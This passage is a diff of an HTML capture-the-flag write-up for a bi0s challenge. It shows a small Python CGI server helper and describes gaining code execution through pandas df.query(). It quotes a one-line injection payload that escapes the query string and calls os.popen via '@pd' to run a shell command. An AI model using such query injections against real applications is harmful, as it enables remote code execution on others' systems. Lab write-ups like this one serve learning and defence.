+</span></span><span style="display:flex;"><span>                params_dict[params<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#34;=&#34;</span>)[<span style="color:#bd93f9">0</span>]] <span style="color:#ff79c6">=</span> params<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#34;=&#34;</span>)[<span style="color:#bd93f9">1</span>]
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> params_dict
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_var</span>(<span style="font-style:italic">self</span>, variable):
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> environ<span style="color:#ff79c6">.</span>get(variable)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">set_header</span>(<span style="font-style:italic">self</span>, header, value):
+</span></span><span style="display:flex;"><span>        <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>response_headers[header] <span style="color:#ff79c6">=</span> value
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">add_body</span>(<span style="font-style:italic">self</span>, value):
+</span></span><span style="display:flex;"><span>        <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>response_body <span style="color:#ff79c6">+=</span> value
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">send_file</span>(<span style="font-style:italic">self</span>, filename):
+</span></span><span style="display:flex;"><span>        <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>response_body <span style="color:#ff79c6">+=</span> <span style="color:#8be9fd;font-style:italic">open</span>(filename, <span style="color:#f1fa8c">&#34;r&#34;</span>)<span style="color:#ff79c6">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">send_response</span>(<span style="font-style:italic">self</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> header <span style="color:#ff79c6">in</span> <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>response_headers:
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>header<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">: </span><span style="color:#f1fa8c">{</span><span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>response_headers[header]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>response_body)
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span></code></pre></div><p>At first i was thinking there might a vulnerability in the way the server handles parameters or something.. but perhaps we can get rce in the search_currency.py somehow?</p>
 <p>I tried for a bit but without success until while i was asleep one of our teammates figured out a way to get rce inside <code>df.query()</code> from the pandas library.</p>
 <h3 id="exploit">Exploit</h3>
 <p><img src="pycgi2.png" alt=""></p>
 <p>So turns out we can call and import variables inside the df.query() with <code>@</code></p>
 <p>After the CTF ended, someone published their solution which was way more elegant using the os library from pandas itself!</p>
-<pre><code>a'+(@pd.io.common.os.popen('ls &gt; /tmp/ls').read())+'
+<pre tabindex="0"><code>a&#39;+(@pd.io.common.os.popen(&#39;ls &gt; /tmp/ls&#39;).read())+&#39;
 </code></pre><p>Overall great challenge, learned alot from it, it took longer than it should but it was rewarding.</p>
 <p>Thanks to bi0s for the great CTF hoping to play next year !</p>
 
